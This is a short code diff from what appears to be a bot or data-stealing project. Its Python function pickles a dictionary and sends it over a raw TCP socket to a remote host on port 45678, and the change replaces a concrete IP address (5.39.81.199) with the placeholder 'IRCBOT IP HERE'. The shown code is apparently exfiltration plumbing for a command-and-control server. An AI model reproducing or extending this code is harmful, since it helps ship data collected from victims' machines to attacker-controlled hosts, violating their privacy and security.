@@ -15,7 +15,7 @@ def pack():
     pickled = pickle.dumps(dictionary)
     nudge(pickled)
 def nudge(data):
-       HOST = "5.39.81.199"
+       HOST = "IRCBOT IP HERE"
        PORT = 45678
        size = 1024
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
